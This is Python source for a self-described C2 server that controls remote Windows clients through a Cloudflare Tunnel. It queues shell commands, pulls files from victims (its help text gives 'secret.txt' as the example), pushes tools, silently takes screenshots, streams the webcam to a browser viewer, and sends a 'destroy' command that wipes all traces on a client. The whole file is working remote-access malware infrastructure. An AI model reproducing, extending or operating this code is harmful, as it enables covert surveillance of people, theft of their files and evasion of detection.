#!/usr/bin/env python3
"""
HTTP-based C2 server with multi-client, streaming output, interactive stdin,
and cancel support. Runs on Mac behind Cloudflare Tunnel.
Usage: python3 server.py
"""

VERSION = "3.2.0"

# ── Auth ─────────────────────────────────────────────────────────────────────
# Set TOKEN to any hard-to-guess string (e.g. a random UUID).
# Clients must send it as the X-Token header on every request.
# ENFORCE_TOKEN = True → unknown callers get 403 (production mode).
TOKEN = "81f7cc9dca3ded71456c89a83b8a5325fc7d9a345b76c7ac6eba8aa96fdd3782"
ENFORCE_TOKEN = True
# ─────────────────────────────────────────────────────────────────────────────

from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
from urllib.parse import urlparse, parse_qs
import socket
import threading
import sys
import time
import queue
import signal
import os
import readline  # enables arrow-key history in input()
import io

# Per-client state
clients = {}
lock = threading.Lock()
active_client = None
result_queue = queue.Queue(maxsize=500)  # (client_id, kind, body)
camera_frames = {}  # client_id -> latest frame data
camera_last_frame_at = {}
camera_start_times = {}
streaming_clients = set()
pending_files = {}  # client_id -> (filename, bytes) waiting for client to fetch
capture_frames = {}  # client_id -> (jpeg_bytes, timestamp) for single screenshot

# Hard cap on request body size (uploads/screenshots/frames). Prevents a
# bogus giant Content-Length from ballooning handler-thread memory.
MAX_BODY_BYTES = 256 * 1024 * 1024


# Silence longer than this before a reconnecting client's state is stale.
# Active commands poll /signal + /stdin every ~3s, so >120s of total silence
# mid-command means the client dropped (reboot, sleep, network loss).
STALE_STATE_AFTER = 120


def _reset_stale_state(client_id, client):
    """Clear wedged per-client state when a previously-offline client checks in.

    Without this, command_running=True from before an outage persists forever:
    the session shows RUNNING, refuses every new command, and effectively
    disappears from the operator's workflow. Must be called with the lock held
    and BEFORE refreshing last_checkin."""
    if (
        not client["command_running"]
        and not client["pending_stdin"]
        and not client["interactive"]
    ):
        return
    silent_for = time.time() - client["last_checkin"]
    if silent_for <= STALE_STATE_AFTER:
        return
    client["command_running"] = False
    client["interactive"] = False
    client["pending_stdin"] = []
    client["cmd_event"].clear()
    safe_print(
        f"[*] {client_id} back after {silent_for:.0f}s silence — cleared stale command state."
    )


def get_or_create_client(client_id):
    """Get or create a client entry. Must be called with lock held."""
    if client_id not in clients:
        clients[client_id] = {
            "last_checkin": 0,
            "pending_command": None,
            "pending_signal": None,
            "pending_camera_signal": None,
            "pending_stdin": [],
            "command_running": False,
            "interactive": False,
            "cmd_event": threading.Event(),  # set when a command is ready
        }
    else:
        _reset_stale_state(client_id, clients[client_id])
    return clients[client_id]


def set_command(client, cmd):
    client["pending_command"] = cmd
    client["cmd_event"].set()


def clear_command(client):
    """Reset pending/running command state for a client.

    Referenced by cancel_shortcut (Ctrl+\\) — was missing, which made the
    shortcut raise NameError instead of cancelling. Must be called with lock held."""
    client["command_running"] = False
    client["interactive"] = False
    client["pending_command"] = None
    client["pending_stdin"] = []
    client["cmd_event"].clear()


def clear_camera_state(client_id):
    camera_frames.pop(client_id, None)
    camera_last_frame_at.pop(client_id, None)
    camera_start_times.pop(client_id, None)
    streaming_clients.discard(client_id)


def is_camera_stream_active(client_id, now=None):
    if client_id not in streaming_clients:
        return False
    now = time.time() if now is None else now
    last_frame_at = camera_last_frame_at.get(client_id)
    if last_frame_at and (now - last_frame_at) <= 5:
        return True
    start_time = camera_start_times.get(client_id)
    if start_time and (now - start_time) <= 10:
        return True
    clear_camera_state(client_id)
    return False


def get_prompt():
    if active_client:
        client = clients.get(active_client)
        if client and client.get("interactive"):
            return f"{active_client} [interactive]> "
        return f"{active_client}> "
    return "shell> "


def safe_print(msg):
    """Print a status message without clobbering the readline input buffer.
    Saves the current partially-typed line, prints the message on its own
    line, then redraws the prompt + saved text so the user's input is intact."""
    buf = readline.get_line_buffer()
    prompt = get_prompt()
    sys.stdout.write(f"\r\033[K{msg}\n{prompt}{buf}")
    sys.stdout.flush()

def cancel_shortcut(signum, frame):
    """Handle Ctrl+\\ to cancel the running remote command on the active client."""
    with lock:
        if not active_client:
            safe_print("[*] No active client. Use 'use <id>' to select one.")
            return
        client = clients.get(active_client)
        if client and (client["command_running"] or client["pending_command"]):
            client["pending_signal"] = "cancel"
            clear_command(client)
            safe_print(f"[*] Cancel signal sent to {active_client} (Ctrl+\\).")
        else:
            safe_print(f"[*] No command running on {active_client}.")


signal.signal(signal.SIGQUIT, cancel_shortcut)


class DualStackHTTPServer(ThreadingMixIn, HTTPServer):
    """Listen on both IPv4 and IPv6 so cloudflared can connect via either."""

    daemon_threads = True
    address_family = socket.AF_INET6
    request_queue_size = 32

    def server_bind(self):
        if self.address_family == socket.AF_INET6:
            self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, 0)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        super().server_bind()

    def handle_error(self, request, client_address):
        """Silence routine connection drops (dead clients, phone networks,
        cloudflared restarts) instead of dumping a traceback per request."""
        exc = sys.exc_info()[1]
        if isinstance(exc, (BrokenPipeError, ConnectionResetError, TimeoutError, socket.timeout)):
            return
        sys.stderr.write(f"[!] Handler error from {client_address}: {exc!r}\n")


def enqueue_result(client_id, kind, body):
    """Queue console output. Live 'stream' chunks are droppable under
    pressure; final 'result' payloads are never silently lost."""
    item = (client_id, kind, body)
    if kind != "result":
        try:
            result_queue.put_nowait(item)
        except queue.Full:
            pass
        return
    while True:
        try:
            result_queue.put_nowait(item)
            return
        except queue.Full:
            pass
        # Queue full: drain it, keep only the newest results (plus ours),
        # discard transient stream chunks, then re-fill.
        drained = []
        while True:
            try:
                drained.append(result_queue.get_nowait())
            except queue.Empty:
                break
        keep = [d for d in drained if d[1] == "result"][-(result_queue.maxsize - 1):]
        for kept in keep + [item]:
            try:
                result_queue.put_nowait(kept)
            except queue.Full:
                break
        return


class Handler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

    protocol_version = "HTTP/1.1"
    # Per-socket timeout: reaps handler threads stuck on half-dead
    # connections. Must comfortably exceed the 30s /cmd long-poll hold.
    timeout = 65

    def _parse_client_id(self):
        """Extract client ID from ?id= query parameter."""
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)
        ids = params.get("id", [])
        return ids[0] if ids else None

    def _check_token(self):
        """Return True if the request carries the correct token (or enforcement is off).
        Checks X-Token header first, then ?token= query param as fallback.
        When ENFORCE_TOKEN is False the check always passes (compatibility mode).
        """
        if not ENFORCE_TOKEN:
            return True
        provided = (
            self.headers.get("X-Token", "")
            or parse_qs(urlparse(self.path).query).get("token", [""])[0]
        )
        return provided == TOKEN

    def _respond(self, code, body=b""):
        """Helper to send a response with proper headers."""
        self.send_response(code)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(body)))
        # Always close: prevents cloudflared HTTP/2 reuse issues
        self.send_header("Connection", "close")
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        parsed = urlparse(self.path)
        path   = parsed.path
        # Browser-facing viewer pages cannot send custom headers — exempt them.
        if path not in ("/camera_view", "/camera_snapshot", "/capture_view", "/capture_snapshot"):
            if not self._check_token():
                self._respond(403, b"forbidden")
                return
        client_id = self._parse_client_id()

        if path == "/cmd":
            if not client_id:
                self._respond(400, b"missing id")
                return
            # Long-poll: hold the connection open up to 30s waiting for a command.
            # This replaces the client's adaptive sleep — 0 CPU/network when idle.
            LONG_POLL_TIMEOUT = 30  # seconds
            with lock:
                client = get_or_create_client(client_id)
                client["last_checkin"] = time.time()
                event = client["cmd_event"]
                cmd = client["pending_command"] or ""
                if cmd:
                    client["pending_command"] = None
                    event.clear()
            if not cmd:
                # Wait outside the lock so other threads can set a command
                event.wait(timeout=LONG_POLL_TIMEOUT)
                with lock:
                    client = clients.get(client_id)
                    if client:
                        client["last_checkin"] = time.time()
                        cmd = client["pending_command"] or ""
                        client["pending_command"] = None
                        # Clear unconditionally: a stale/spurious wakeup that
                        # leaves the event set makes every later poll return
                        # instantly (busy-loop) instead of long-polling.
                        client["cmd_event"].clear()
            self._respond(200, cmd.encode())

        elif path == "/signal":
            if not client_id:
                self._respond(200, b"")
                return
            with lock:
                client = get_or_create_client(client_id)
                client["last_checkin"] = time.time()
                sig = client["pending_signal"] or ""
                client["pending_signal"] = None
            self._respond(200, sig.encode())

        elif path == "/camera_signal":
            if not client_id:
                self._respond(200, b"")
                return
            with lock:
                client = get_or_create_client(client_id)
                client["last_checkin"] = time.time()
                sig = client["pending_camera_signal"] or ""
                client["pending_camera_signal"] = None
            self._respond(200, sig.encode())

        elif path == "/stdin":
            if not client_id:
                self._respond(200, b"")
                return
            with lock:
                client = get_or_create_client(client_id)
                client["last_checkin"] = time.time()
                lines = client["pending_stdin"]
                data = "\n".join(lines) if lines else ""
                client["pending_stdin"] = []
            self._respond(200, data.encode())

        elif path == "/ping":
            if client_id:
                with lock:
                    client = get_or_create_client(client_id)
                    client["last_checkin"] = time.time()
            self._respond(200, b"pong")

        elif path == "/fetch":
            # Client fetches a file the operator pushed via 'put'
            if not client_id:
                self._respond(400, b"missing id")
                return
            with lock:
                entry = pending_files.pop(client_id, None)
            if entry:
                filename, data = entry
                self.send_response(200)
                self.send_header("Content-Type", "application/octet-stream")
                self.send_header(
                    "Content-Disposition", f'attachment; filename="{filename}"'
                )
                self.send_header("Content-Length", str(len(data)))
                self.end_headers()
                self.wfile.write(data)
            else:
                self._respond(204, b"")  # no file pending

        elif path == "/camera_snapshot":
            if not client_id:
                self._respond(400, b"missing id")
                return
            with lock:
                frame = camera_frames.get(client_id)
                last_frame_at = camera_last_frame_at.get(client_id)
            if last_frame_at and (time.time() - last_frame_at) > 5:
                self._respond(204, b"")
                return
            if not frame:
                self._respond(204, b"")
                return
            self.send_response(200)
            self.send_header("Content-Type", "image/jpeg")
            self.send_header("Content-Length", str(len(frame)))
            self.send_header("Cache-Control", "no-cache, no-store, must-revalidate")
            self.send_header("Connection", "close")
            self.end_headers()
            self.wfile.write(frame)

        elif path == "/camera_view":
            if not client_id:
                self._respond(400, b"missing id")
                return
            html = f"""<!DOCTYPE html>
<html><head><meta charset=utf-8>
<title>Camera — {client_id}</title>
<style>
  body{{margin:0;background:#111;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;font-family:monospace;color:#0f0}}
  img{{max-width:100%;max-height:90vh;border:1px solid #333}}
  p{{font-size:12px;margin:6px 0 0;opacity:.6}}
</style>
</head>
<body>
  <img id=f src='/camera_snapshot?id={client_id}&t=0' alt='No frame yet'>
  <p id=s>Connecting...</p>
<script>
  var img=document.getElementById('f'),st=document.getElementById('s'),n=0,ok=0,bad=0,busy=false;
  function refresh(){{
    if(busy)return;
    busy=true;
    var t=new Image();
    t.onload=function(){{img.src=t.src;ok++;bad=0;busy=false;st.textContent='Live \u2014 frame '+ok;}}
    t.onerror=function(){{bad++;busy=false;if(bad>10)st.textContent='No signal ('+bad+' misses)';}}
    t.src='/camera_snapshot?id={client_id}&t='+(++n);
  }}
  refresh();
  setInterval(refresh,200);
</script>
</body></html>"""
            body = html.encode()
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.send_header("Connection", "close")
            self.end_headers()
            self.wfile.write(body)

        elif path == "/capture_snapshot":
            if not client_id:
                self._respond(400, b"missing id")
                return
            with lock:
                entry = capture_frames.get(client_id)
            if not entry:
                self._respond(204, b"")
                return
            frame, ts = entry
            self.send_response(200)
            self.send_header("Content-Type", "image/jpeg")
            self.send_header("Content-Length", str(len(frame)))
            self.send_header("Cache-Control", "no-cache, no-store, must-revalidate")
            self.send_header("Connection", "close")
            self.end_headers()
            self.wfile.write(frame)

        elif path == "/capture_view":
            if not client_id:
                self._respond(400, b"missing id")
                return
            with lock:
                entry = capture_frames.get(client_id)
            if not entry:
                body = b"<html><body style='background:#111;color:#0f0;font-family:monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0'><p>No screenshot yet. Run <b>capture</b> again.</p></body></html>"
                self.send_response(200)
                self.send_header("Content-Type", "text/html; charset=utf-8")
                self.send_header("Content-Length", str(len(body)))
                self.send_header("Connection", "close")
                self.end_headers()
                self.wfile.write(body)
                return
            frame, ts = entry
            import datetime
            taken = datetime.datetime.fromtimestamp(ts).strftime("%Y-%m-%d %H:%M:%S")
            html = f"""<!DOCTYPE html>
<html><head><meta charset=utf-8><title>Screenshot \u2014 {client_id}</title>
<style>
  body{{margin:0;background:#111;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;font-family:monospace;color:#0f0}}
  img{{max-width:100%;max-height:92vh;border:1px solid #333;display:block}}
  p{{font-size:12px;margin:6px 0 0;opacity:.6}}
</style></head><body>
  <img src='/capture_snapshot?id={client_id}' alt='screenshot'>
  <p>{client_id} \u2014 captured {taken}</p>
</body></html>"""
            body = html.encode()
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.send_header("Connection", "close")
            self.end_headers()
            self.wfile.write(body)
        else:
            self._respond(404)

    def do_POST(self):
        if not self._check_token():
            self._respond(403, b"forbidden")
            return
        parsed = urlparse(self.path)
        path = parsed.path
        client_id = self._parse_client_id()

        try:
            length = int(self.headers.get("Content-Length", 0))
        except (TypeError, ValueError):
            self._respond(400, b"bad content-length")
            return
        if length < 0:
            self._respond(400, b"bad content-length")
            return
        if length > MAX_BODY_BYTES:
            self._respond(413, b"body too large")
            return
        raw_body_bytes = self.rfile.read(length)
        if len(raw_body_bytes) < length:
            self._respond(400, b"incomplete body")
            return
        body = raw_body_bytes.decode(errors="replace")

        if path == "/stream":
            if client_id:
                with lock:
                    client = get_or_create_client(client_id)
                    client["last_checkin"] = time.time()
            enqueue_result(client_id, "stream", body)
            self._respond(200, b"ok")

        elif path == "/result":
            if client_id:
                with lock:
                    client = get_or_create_client(client_id)
                    client["last_checkin"] = time.time()
                    client["command_running"] = False
                    client["interactive"] = False
                    client["pending_stdin"] = []
            # Never drop /result — enqueue_result evicts droppable stream
            # chunks under pressure and always keeps final payloads (the old
            # inline loop could silently discard the result when the queue
            # happened to drain between the failed put and its evict).
            enqueue_result(client_id, "result", body)
            self._respond(200, b"ok")

        elif path == "/interactive":
            # Explicit interactive state flag — no marker parsing needed
            if client_id:
                with lock:
                    client = get_or_create_client(client_id)
                    client["interactive"] = body.strip().lower() == "true"
            self._respond(200, b"ok")

        elif path == "/upload":
            # Endpoint for clients to upload a file to the operator's Desktop
            if not client_id:
                self._respond(400, b"missing id")
                return
            parsed_path = urlparse(self.path)
            params = parse_qs(parsed_path.query)
            filename = params.get("filename", ["unknown_file"])[0]
            # Sanitize: keep only the basename, then hard-reject any remaining
            # path separator characters and empty names so a crafted filename
            # cannot escape ~/Desktop even on non-POSIX systems.
            filename = os.path.basename(filename)
            if not filename or '/' in filename or '\\' in filename:
                self._respond(400, b"invalid filename")
                return
            with lock:
                client = get_or_create_client(client_id)
                client["last_checkin"] = time.time()
                client["command_running"] = False
                client["pending_stdin"] = []
            # Read raw bytes
            raw_bytes = raw_body_bytes
            desktop = os.path.expanduser("~/Desktop")
            os.makedirs(desktop, exist_ok=True)  # headless boxes may have no Desktop yet
            dest = os.path.join(desktop, filename)
            try:
                with open(dest, "wb") as f:
                    f.write(raw_bytes)
                msg = f"[+] File saved to ~/Desktop/{filename} ({len(raw_bytes):,} bytes)\n"
            except Exception as e:
                msg = f"[!] Failed to save file: {e}\n"
            try:
                result_queue.put_nowait((client_id, "result", msg))
            except queue.Full:
                pass
            self._respond(200, b"ok")

        elif path == "/camera_frame":
            if not client_id:
                self._respond(400, b"missing id")
                return
            with lock:
                client = get_or_create_client(client_id)
                client["last_checkin"] = time.time()
                camera_frames[client_id] = raw_body_bytes
                camera_last_frame_at[client_id] = time.time()
                streaming_clients.add(client_id)
            self._respond(200, b"ok")

        elif path == "/capture_frame":
            if not client_id:
                self._respond(400, b"missing id")
                return
            with lock:
                client = get_or_create_client(client_id)
                client["last_checkin"] = time.time()
                capture_frames[client_id] = (raw_body_bytes, time.time())
            self._respond(200, b"ok")

        else:
            self._respond(404)


def result_printer():
    """Drain the result queue and print output cleanly."""
    while True:
        try:
            client_id, kind, body = result_queue.get(timeout=0.5)
            if body:
                with lock:
                    multi = len(clients) > 1
                    is_interactive = (
                        clients.get(client_id, {}).get("interactive", False)
                        if client_id
                        else False
                    )
                tag = f"[{client_id}] " if (multi and client_id) else ""
                sys.stdout.write(f"\r\033[K{tag}{body}")
                if kind == "stream" and is_interactive:
                    sys.stdout.write(get_prompt())
            if kind == "result":
                sys.stdout.write(get_prompt())
            sys.stdout.flush()
        except queue.Empty:
            pass


def _resolve_client(target):
    """Resolve a target string to a client ID. Must be called with lock held.
    Supports: index number, exact match, or case-insensitive partial match."""
    # Try by number
    try:
        idx = int(target) - 1
        client_list = list(clients.keys())
        if 0 <= idx < len(client_list):
            return client_list[idx]
    except ValueError:
        pass
    # Exact match
    if target in clients:
        return target
    # Partial match (case-insensitive)
    for cid in clients:
        if target.lower() in cid.lower():
            return cid
    return None


def input_loop():
    global active_client
    while True:
        try:
            cmd = input(get_prompt())
            if not cmd.strip():
                continue
        except (EOFError, KeyboardInterrupt):
            print("\n[*] Exiting.")
            os._exit(0)

        stripped = cmd.strip().lower()

        # --- Built-in commands (always handled, even during interactive sessions) ---
        BUILTINS = {
            "cancel",
            "sessions",
            "status",
            "help",
            "exit",
            "stream",
            "stopstream",
            "capture",
            # Registered so `destroy` is intercepted even while a command is
            # running — otherwise it leaks into the remote process's stdin.
            "destroy",
        }
        BUILTIN_PREFIXES = ("use ", "kill ", "remove ", "get ", "put ")
        is_builtin = stripped in BUILTINS or any(
            stripped.startswith(p) for p in BUILTIN_PREFIXES
        )

        if stripped == "cancel":
            with lock:
                if not active_client:
                    print("[*] No active client. Use 'use <id>' to select one.")
                    continue
                client = clients.get(active_client)
                if client and (client["command_running"] or client["pending_command"]):
                    client["pending_signal"] = "cancel"
                    client["pending_command"] = None
                    client["pending_stdin"] = []
                    print(f"[*] Cancel signal queued for {active_client}.")
                else:
                    print(f"[*] No command running on {active_client}.")
            continue

        # While a command is running, forward non-builtin input as stdin.
        if not is_builtin:
            with lock:
                active_state = clients.get(active_client) if active_client else None
                if active_state and active_state["command_running"]:
                    active_state["pending_stdin"].append(cmd)
                    continue

        if stripped == "sessions":
            with lock:
                if not clients:
                    print("[*] No clients have connected yet.")
                else:
                    print(f"[*] {len(clients)} client(s):")
                    for i, (cid, state) in enumerate(clients.items(), 1):
                        elapsed = (
                            time.time() - state["last_checkin"]
                            if state["last_checkin"] > 0
                            else -1
                        )
                        if elapsed < 0:
                            status = "NEVER SEEN"
                        elif elapsed < 45:
                            mode = "RUNNING" if state["command_running"] else "IDLE"
                            status = f"ONLINE ({mode}) — {elapsed:.1f}s ago"
                        else:
                            status = f"OFFLINE — {elapsed:.0f}s ago"
                        marker = " ←" if cid == active_client else ""
                        print(f"  [{i}] {cid:20s}  {status}{marker}")
            continue

        if stripped.startswith("use "):
            target = cmd.strip()[4:].strip()
            if not target:
                print("[*] Usage: use <client-id or number>")
                continue
            with lock:
                match = _resolve_client(target)
                if match:
                    active_client = match
                    print(f"[*] Active target: {active_client}")
                else:
                    print(
                        f"[!] No client matching '{target}'. Type 'sessions' to list clients."
                    )
            continue

        if stripped == "status":
            with lock:
                if not active_client:
                    print("[*] No active client. Use 'use <id>' to select one.")
                    continue
                client = clients.get(active_client)
                if not client:
                    print(f"[!] Client {active_client} not found.")
                    continue
                elapsed = (
                    time.time() - client["last_checkin"]
                    if client["last_checkin"] > 0
                    else -1
                )
                is_running = client["command_running"]
            if elapsed < 0:
                print(f"[*] {active_client}: No check-in yet.")
            elif elapsed < 45:
                state = "RUNNING command" if is_running else "IDLE"
                print(
                    f"[*] {active_client}: ONLINE ({state}) — last check-in {elapsed:.1f}s ago"
                )
            else:
                print(
                    f"[!] {active_client}: may be OFFLINE — last check-in {elapsed:.0f}s ago"
                )
            continue

        if stripped.startswith("kill "):
            target = cmd.strip()[5:].strip()
            if not target:
                print("[*] Usage: kill <client-id or number>")
                continue
            with lock:
                match = _resolve_client(target)
                if match:
                    clients[match]["pending_command"] = "exit"
                    clients[match]["cmd_event"].set()
                    clients[match]["pending_stdin"] = []
                    print(f"[*] Exit command sent to {match}.")
                    if active_client == match:
                        active_client = None
                        print("[*] Active target cleared.")
                else:
                    print(f"[!] No client matching '{target}'.")
            continue

        if stripped.startswith("destroy ") or stripped == "destroy":
            target = cmd.strip()[8:].strip() if stripped.startswith("destroy ") else ""
            with lock:
                if not target:
                    if not active_client:
                        print("[*] No active client. Use 'use <id>' or 'destroy <id>'.")
                        continue
                    target = active_client
                match = _resolve_client(target)
                if match:
                    clients[match]["pending_command"] = "destroy"
                    clients[match]["cmd_event"].set()
                    clients[match]["pending_stdin"] = []
                    print(f"[*] Destroy command sent to {match}.")
                    print(f"[*] Client will wipe all traces and self-terminate.")
                    if active_client == match:
                        active_client = None
                        print("[*] Active target cleared.")
                else:
                    print(f"[!] No client matching '{target}'.")
            continue

        if stripped.startswith("remove "):
            target = cmd.strip()[7:].strip()
            if not target:
                print("[*] Usage: remove <client-id or number>")
                continue
            with lock:
                match = _resolve_client(target)
                if match:
                    del clients[match]
                    clear_camera_state(match)
                    capture_frames.pop(match, None)
                    pending_files.pop(match, None)
                    print(f"[*] Removed {match} from sessions.")
                    if active_client == match:
                        active_client = None
                        print("[*] Active target cleared.")
                else:
                    print(f"[!] No client matching '{target}'.")
            continue

        if stripped == "help":
            print("╔═══════════════════════════════════════════════════╗")
            print("║  Shell C2 — Command Reference                    ║")
            print("╚═══════════════════════════════════════════════════╝")
            print()
            print("  SESSION MANAGEMENT:")
            print("    sessions          List all connected clients")
            print("    use <id>          Switch active target (name or #)")
            print("    status            Check if active client is online")
            print("    kill <id>         Send exit to client (removes it)")
            print("    destroy           Wipe all traces on active client (tasks, script, log, process)")
            print("    destroy <id>      Wipe all traces on specific client")
            print("    remove <id>       Remove stale client from list")
            print()
            print("  EXAMPLES:")
            print("    use 1             Select client #1")
            print("    use ANIKETB52D    Select by name (partial match)")
            print("    kill 1            Kill client #1 (full cleanup)")
            print("    kill ANIKETB52D   Kill by name")
            print()
            print("  COMMAND CONTROL:")
            print("    cancel            Abort running command on active client")
            print("    Ctrl+\\            Same as cancel (keyboard shortcut)")
            print()
            print("  REMOTE COMMANDS (sent to client):")
            print(
                "    get <filepath>    Download file from client to ~/Desktop (abs or relative to cwd)"
            )
            print(
                "    put <filepath>    Upload local file to client's script dir (abs or relative)"
            )
            print("    stream            Start webcam/screen streaming on client")
            print("    stopstream        Stop webcam streaming")
            print("    capture           Take a silent screenshot, view in browser")
            print("    version           Show client version, host, PID")
            print("    update            Force self-update from GitHub now")
            print("    gui:<cmd>         Launch GUI on user's desktop")
            print("    notimeout:<cmd>   Run without 300s timeout")
            print()
            print("  EXAMPLES:")
            print("    stream            Start webcam → view in browser")
            print("    stopstream        Stop webcam")
            print("    gui:explorer .    Open Explorer on remote desktop")
            print("    gui:code .        Open VS Code in current dir")
            print("    notimeout:ping -t 8.8.8.8   Run forever until cancel")
            print()
            print("  SHORTCUTS (auto-routes to gui):")
            print("    camera            Open Windows Camera app")
            print("    recorder          Open Sound Recorder")
            print("    settings          Open Windows Settings")
            print("    calc              Open Calculator")
            print()
            print("  WEBCAM VIEWING:")
            print(
                "    After 'stream', open: http://localhost:4444/camera_view?id=<client_id>"
            )
            print()
            print("  SERVER:")
            print("    exit              Shut down THIS server (not client)")
            print("    help              Show this message")
            print()
            print("  ⚠  'exit' shuts the SERVER. Use 'kill <id>' to stop a client.")
            continue

        if stripped == "exit":
            print("[*] Shutting down server.")
            os._exit(0)

        if stripped == "stream":
            with lock:
                if not active_client:
                    print("[*] No active client. Use 'use <id>' to select one.")
                    continue
                client = clients.get(active_client)
                if not client:
                    print(f"[!] Client {active_client} not found.")
                    continue
                if client["command_running"]:
                    print(
                        f"[!] Command already running on {active_client}. Cancel first."
                    )
                    continue
                if (
                    is_camera_stream_active(active_client)
                    or client["pending_command"] == "stopstream"
                    or client["pending_camera_signal"] == "stopstream"
                ):
                    print(
                        f"[!] Already streaming from {active_client}. Use 'stopstream' first."
                    )
                    continue
                client["pending_camera_signal"] = None
                client["pending_command"] = "stream"
                client["cmd_event"].set()
                streaming_clients.add(active_client)
                camera_start_times[active_client] = time.time()
            print(f"[*] Camera stream started on {active_client}")
            print(f"[*] View at: http://localhost:4444/camera_view?id={active_client}")
            print("[*] Waiting for client to connect...")
            continue

        if stripped == "capture":
            with lock:
                if not active_client:
                    print("[*] No active client. Use 'use <id>' to select one.")
                    continue
                client = clients.get(active_client)
                if not client:
                    print(f"[!] Client {active_client} not found.")
                    continue
                if client["command_running"]:
                    print(f"[!] Command already running on {active_client}. Cancel first.")
                    continue
                client["pending_stdin"] = []
                client["pending_command"] = "capture"
                client["cmd_event"].set()
                client["command_running"] = True
            print(f"[*] Screenshot requested from {active_client}...")
            print(f"[*] View at: http://localhost:4444/capture_view?id={active_client}")
            continue

        if stripped == "stopstream":
            with lock:
                if not active_client:
                    print("[*] No active client. Use 'use <id>' to select one.")
                    continue
                client = clients.get(active_client)
                if not client:
                    print(f"[!] Client {active_client} not found.")
                    continue
                clear_camera_state(active_client)
                client["pending_camera_signal"] = "stopstream"
                client["pending_command"] = "stopstream"
                client["cmd_event"].set()
                client["pending_stdin"] = []
            print(f"[*] Camera stream stopped on {active_client}")
            continue

        if stripped.startswith("get "):
            filename = cmd.strip()[4:].strip()
            if not filename:
                print(
                    "[*] Usage: get <filepath>  (e.g. get C:\\Users\\user\\secret.txt)"
                )
                continue
            with lock:
                if not active_client:
                    print("[*] No active client. Use 'use <id>' to select one.")
                    continue
                client = clients.get(active_client)
                if not client:
                    print(f"[!] Client {active_client} not found.")
                    continue
                if client["command_running"]:
                    print(
                        f"[!] Command already running on {active_client}. Cancel first."
                    )
                    continue
                client["pending_stdin"] = []
                client["pending_command"] = f"get:{filename}"
                client["cmd_event"].set()
                client["command_running"] = True
            print(f"[*] Requesting '{filename}' from {active_client}...")
            continue

        if stripped.startswith("put "):
            localpath = cmd.strip()[4:].strip()
            if not localpath:
                print(
                    "[*] Usage: put <local-filepath>  (e.g. put ~/Desktop/tool.exe or put tool.exe)"
                )
                continue
            localpath = os.path.expanduser(localpath)
            if not os.path.isabs(localpath):
                localpath = os.path.join(os.getcwd(), localpath)
            if not os.path.isfile(localpath):
                print(f"[!] Local file not found: {localpath}")
                continue
            # Read the file OUTSIDE the lock: a large/slow disk read must not
            # stall every request thread and the operator console.
            try:
                with open(localpath, "rb") as f:
                    data = f.read()
            except Exception as e:
                print(f"[!] Cannot read file: {e}")
                continue
            filename = os.path.basename(localpath)
            with lock:
                if not active_client:
                    print("[*] No active client. Use 'use <id>' to select one.")
                    continue
                client = clients.get(active_client)
                if not client:
                    print(f"[!] Client {active_client} not found.")
                    continue
                if client["command_running"]:
                    print(
                        f"[!] Command already running on {active_client}. Cancel first."
                    )
                    continue
                pending_files[active_client] = (filename, data)
                client["pending_stdin"] = []
                client["pending_command"] = f"put:{filename}"
                client["cmd_event"].set()
                client["command_running"] = True
            print(
                f"[*] Pushing '{filename}' ({len(data):,} bytes) to {active_client}..."
            )
            continue

        # --- Remote command or stdin ---
        with lock:
            if not active_client:
                print("[*] No active client. Use 'use <id>' to select one.")
                continue
            client = clients.get(active_client)
            if not client:
                print(f"[!] Client {active_client} not found.")
                continue
            if client["command_running"]:
                # Command already running — route input as stdin
                client["pending_stdin"].append(cmd)
            else:
                if client["pending_command"]:
                    print(
                        f"[!] Previous command on {active_client} still pending — overwriting."
                    )
                client["pending_stdin"] = []
                client["pending_command"] = cmd
                client["cmd_event"].set()
                client["command_running"] = True


def status_printer():
    shown_warnings = set()
    while True:
        time.sleep(10)
        # Copy state under lock, print after releasing
        alerts = []
        cleared = []
        with lock:
            for cid, state in clients.items():
                checkin = state["last_checkin"]
                if checkin > 0:
                    elapsed = time.time() - checkin
                    if elapsed > 45 and cid not in shown_warnings:
                        alerts.append((cid, elapsed))
                        shown_warnings.add(cid)
                    elif elapsed <= 45:
                        cleared.append(cid)
        for cid in cleared:
            shown_warnings.discard(cid)
        for cid, elapsed in alerts:
            safe_print(f"[!] {cid}: No check-in for {elapsed:.0f}s — may be offline")


if __name__ == "__main__":
    PORT = 4444
    server = DualStackHTTPServer(("::", PORT), Handler)
    print(f"[*] Shell C2 Server v{VERSION}")
    print(f"[*] Listening on port {PORT} (IPv4 + IPv6)")
    print("[*] Waiting for clients to connect...")
    print("[*] Type 'help' for built-in commands\n")

    threading.Thread(target=input_loop, daemon=True).start()
    threading.Thread(target=result_printer, daemon=True).start()
    threading.Thread(target=status_printer, daemon=True).start()

    # --- Connection resilience ---
    # SIGHUP: ignore, so a detached tmux/SSH parent dying cannot kill the C2.
    try:
        signal.signal(signal.SIGHUP, signal.SIG_IGN)
    except (AttributeError, OSError, ValueError):
        pass  # non-POSIX platform
    # SIGINT (Ctrl+C): one accidental press must not drop the whole C2
    # (observed incident: single stray Ctrl+C -> process exit -> every client
    # behind the tunnel got 502 for minutes/hours). Require a second Ctrl+C
    # within 2 seconds to actually stop.
    first_interrupt_at = 0.0
    while True:
        try:
            server.serve_forever()
            break  # normal return (shutdown() called from another thread)
        except KeyboardInterrupt:
            now = time.time()
            if first_interrupt_at and (now - first_interrupt_at) <= 2.0:
                print("\n[*] Server stopped (confirmed by second Ctrl+C).")
                break
            first_interrupt_at = now
            print(
                "\n[!] Ctrl+C caught — server keeps running (clients stay connected)."
                "\n[!] Press Ctrl+C again within 2 seconds to really stop it."
            )
    server.server_close()
